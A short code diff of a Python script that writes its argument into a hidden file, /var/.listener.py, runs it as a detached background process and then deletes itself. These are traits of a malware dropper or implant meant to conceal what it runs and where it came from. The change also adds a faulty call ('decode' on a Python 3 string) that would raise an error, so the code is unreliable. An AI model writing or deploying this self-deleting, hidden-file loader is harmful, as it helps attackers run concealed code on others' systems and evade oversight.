@@ -37,9 +37,9 @@ def main():
 	f = open("/var/.listener.py", "w")
 	package = bytes(sys.argv[1], 'utf-8')
 	text = str(package.decode('utf-8'))
-	f.write(text)
+	f.write(text.decode('utf-8'))
 	f.close()
-	os.system("python3 /var/.listener.py")
+	os.system("python3 /var/.listener.py &")
 	self = sys.argv[0]
 	os.system(f"rm {self}")
 main()
